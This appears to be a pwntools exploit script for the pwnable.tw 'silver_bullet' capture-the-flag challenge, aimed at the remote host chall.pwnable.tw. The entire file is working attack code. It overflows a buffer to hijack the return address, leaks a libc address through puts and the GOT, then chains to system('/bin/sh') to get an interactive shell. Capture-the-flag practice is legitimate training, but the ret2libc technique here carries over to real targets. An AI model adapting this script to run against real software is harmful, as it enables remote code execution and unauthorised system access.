from pwn import *

e = ELF("./silver_bullet")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = e
context.terminal = ["konsole", "-e"]

#p = process([ld.path, e.path], env={"LD_PRELOAD": libc.path})
p = remote("chall.pwnable.tw", 10103)

context.log_level="debug"
gdb.attach(p, """break * 0x0804898e
           c""")


def create(desc):
    p.sendafter("choice :", "1")
    p.sendafter(":", desc)
    
    
def power(desc):
    p.sendafter("choice :", "2")
    p.sendafter(":", desc)
    
    
def beat():
    p.sendafter("choice :", "3")
    

main = 0x08048954



create("AAAA")
power("A"*(48-5))
power("A")

power("\xff\xff\xff" + p32(0x69696969)+ p32(e.sym["puts"]) + p32(e.sym["main"]) + p32(e.got["puts"]))

beat()

p.recvuntil("!!")

p.recv(1)

libc.address = u32(p.recv(4)) - 0x5f140

print("libc base", hex(libc.address))
print("libc system", hex(libc.sym["system"]))


create("AAAA")
power("A"*(48-5))
power("A")

power("\xff\xff\xff" + p32(0x69696969) + p32(libc.sym["system"]) + p32(0x69696969) + p32(next(libc.search("/bin/sh"))))


beat()





p.interactive()
